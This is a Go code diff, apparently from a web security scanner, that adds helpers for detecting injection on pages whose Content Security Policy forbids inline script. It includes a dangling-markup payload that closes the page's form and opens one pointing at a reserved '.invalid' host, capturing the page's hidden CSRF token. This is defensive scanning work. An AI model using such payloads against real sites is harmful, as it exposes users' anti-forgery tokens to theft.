@@ -178,6 +178,33 @@ func cspPercentEncode(s string) string {
 	return b.String()
 }
 
+// CSPForbidsInline is the exported gate for "a script would have to be inline to
+// run here": true when some policy restricts script sources without
+// 'unsafe-inline'. It is the precondition for the fallback techniques that do
+// NOT need script execution (Angular compilation, dangling markup).
+func CSPForbidsInline(cspHeader string) bool { return cspForbidsInlineScript(cspHeader) }
+
+// DanglingFormTechnique tags the markup-only fallback for a page whose policy
+// forbids inline script: a dangling form that captures the page's own hidden
+// CSRF input, which the verifier can observe in the DOM without any request
+// leaving the browser.
+const DanglingFormTechnique = "dangling_form_capture"
+
+// DanglingFormAction is the action URL the injected form points at. It carries
+// the marker (so it is attributable and dedupable) and uses the reserved
+// .invalid TLD, so even a submitted form could never reach a real host.
+func DanglingFormAction(marker string) string {
+	return "https://" + marker + ".invalid/log"
+}
+
+// DanglingFormValue builds the payload: close the attribute value, close the
+// element, close the page's own form, then open one whose action and submit
+// control are ours. Everything the page renders after the injection point —
+// including its hidden CSRF input — is parsed as a child of this form.
+func DanglingFormValue(marker string) string {
+	return `"></form><form action="` + DanglingFormAction(marker) + `" method="GET"><input type="submit" value="Click">`
+}
+
 // CSPInjectionMarker reports whether cspHeader carries marker (the scan's
 // canary) verbatim, i.e. the parameter that carried it reached the header
 // unencoded. This is the deterministic, server-side half of the CSP-injection
